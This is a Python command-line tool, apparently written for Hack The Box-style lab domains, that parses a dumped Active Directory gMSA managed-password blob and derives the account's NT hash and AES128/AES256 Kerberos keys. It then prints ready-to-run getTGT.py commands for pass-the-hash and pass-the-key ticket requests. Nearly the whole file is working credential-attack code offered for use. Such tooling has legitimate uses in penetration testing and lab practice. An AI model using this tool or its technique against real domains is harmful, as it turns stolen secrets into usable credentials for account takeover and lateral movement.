#!/usr/bin/env python3
"""
gmsa-keydump - gMSA password blob parser and AES key deriver
By Nitel Phyoe (https://github.com/nitelphyoe)

Supports both:
  - Full MSDS-MANAGEDPASSWORD_BLOB (bloodyAD --raw)
  - Pre-extracted password bytes (bloodyAD without --raw)
"""

import argparse
import base64
import hashlib
import struct
import sys
from binascii import hexlify

try:
    from impacket.krb5.crypto import string_to_key
    from impacket.krb5 import constants
except ImportError:
    print("[-] impacket is required: pip install impacket")
    sys.exit(1)

BANNER = r"""
  __ _ _ __ ___  ___  __ _       _
 / _` | '_ ` _ \/ __|/ _` |     | |
| (_| | | | | | \__ \ (_| |  _  | | _____ _   _
 \__, |_| |_| |_|___/\__,_| (_) |_|/ / _ \ | | |
  __/ |                            _   < __/ |_| |
 |___/  dump                      (_)_|\_\___|\__, |
                                               __/ |
  gMSA AES Key Deriver  -  by Nitel Phyoe     |___/
"""


def parse_args():
    parser = argparse.ArgumentParser(
        prog='gmsa-keydump',
        description='gMSA password blob parser and AES key deriver by Nitel',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Full blob from bloodyAD --attr msDS-ManagedPassword --raw
  gmsa-keydump -f gmsa_raw.b64 -s 'P_gMSA$' -d nitel.htb --raw-blob

  # Pre-cut password from bloodyAD --attr msDS-ManagedPassword (no --raw)
  gmsa-keydump -f gmsa_cut.b64 -s 'P_gMSA$' -d nitel.htb

  # Inline base64 string
  gmsa-keydump -b 'AQAAACQC...' -s 'P_gMSA$' -d nitel.htb --raw-blob
        """
    )

    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('-f', '--file',
        help='Path to base64-encoded blob file')
    input_group.add_argument('-b', '--b64',
        help='Base64-encoded blob string (inline)')

    parser.add_argument('-s', '--sam', required=True,
        help='sAMAccountName of the gMSA account (e.g. P_gMSA$)')
    parser.add_argument('-d', '--domain', required=True,
        help='DNS domain of the gMSA (e.g. nitel.htb)')
    parser.add_argument('--raw-blob', action='store_true',
        help='Input is a full MSDS-MANAGEDPASSWORD_BLOB (bloodyAD --raw). '
             'Without this flag input is treated as already-extracted password bytes.')
    parser.add_argument('--no-banner', action='store_true',
        help='Suppress banner output')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0.0')

    return parser.parse_args()


def load_data(args):
    """Load and base64-decode input from file or inline string."""
    if args.file:
        try:
            raw = open(args.file, 'rb').read().strip()
        except FileNotFoundError:
            print(f"[-] File not found: {args.file}")
            sys.exit(1)
    else:
        raw = args.b64.strip().encode()

    # Auto-detect base64 vs raw binary
    try:
        return base64.b64decode(raw)
    except Exception:
        return raw


def extract_from_blob(blob):
    """Parse MSDS-MANAGEDPASSWORD_BLOB and return current password bytes."""
    if len(blob) < 12:
        print("[-] Blob too short to be a valid MSDS-MANAGEDPASSWORD_BLOB")
        sys.exit(1)

    version  = struct.unpack_from('<H', blob, 0)[0]
    total    = struct.unpack_from('<I', blob, 4)[0]
    cur_off  = struct.unpack_from('<H', blob, 8)[0]
    prev_off = struct.unpack_from('<H', blob, 10)[0]

    print(f"[*] Blob version:    {version}")
    print(f"[*] Blob total len:  {total} bytes (actual: {len(blob)})")
    print(f"[*] cur_off={cur_off}, prev_off={prev_off}")

    end = prev_off if prev_off else len(blob)
    currentPassword = blob[cur_off:end][:-2]  # strip 2 null terminator bytes
    return currentPassword


def derive_keys(currentPassword, sam, domain):
    """Derive NT hash and AES keys from raw gMSA password bytes."""
    # NT hash = MD4(raw UTF-16LE password bytes)
    nt = hashlib.new('md4', currentPassword).hexdigest()

    # AES derivation: decode UTF-16LE -> re-encode UTF-8 (the UTF-16LE quirk)
    password_utf8 = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')

    # Salt format: REALM + "host" + samname_without_$_lowercase + "." + domain_lowercase
    salt = '%shost%s.%s' % (
        domain.upper(),
        sam[:-1].lower(),  # strip trailing $
        domain.lower()
    )

    aes256 = string_to_key(
        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
        password_utf8,
        salt.encode()
    )
    aes128 = string_to_key(
        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
        password_utf8,
        salt.encode()
    )

    return nt, salt, aes256.contents, aes128.contents


def main():
    args = parse_args()

    if not args.no_banner:
        print(BANNER)

    data = load_data(args)

    if args.raw_blob:
        print(f"[*] Mode:            raw blob (MSDS-MANAGEDPASSWORD_BLOB)")
        currentPassword = extract_from_blob(data)
    else:
        print(f"[*] Mode:            pre-cut password bytes")
        currentPassword = data

    print(f"[*] SAM:             {args.sam}")
    print(f"[*] Domain:          {args.domain}")
    print(f"[*] Password length: {len(currentPassword)} bytes")

    if len(currentPassword) == 0:
        print("[-] Empty password extracted — check your input or try --raw-blob / without it")
        sys.exit(1)

    nt, salt, aes256, aes128 = derive_keys(currentPassword, args.sam, args.domain)

    print()
    print(f"[*] Salt:            {salt}")
    print(f"[+] NT Hash:         {nt}")
    print(f"[+] AES128:          {hexlify(aes128).decode()}")
    print(f"[+] AES256:          {hexlify(aes256).decode()}")
    print()
    print("[*] Suggested commands:")
    print(f"    getTGT.py '{args.domain}/{args.sam}' -aesKey {hexlify(aes256).decode()} -dc-ip <DC_IP>")
    print(f"    getTGT.py '{args.domain}/{args.sam}' -hashes :{nt} -dc-ip <DC_IP>")


if __name__ == '__main__':
    main()
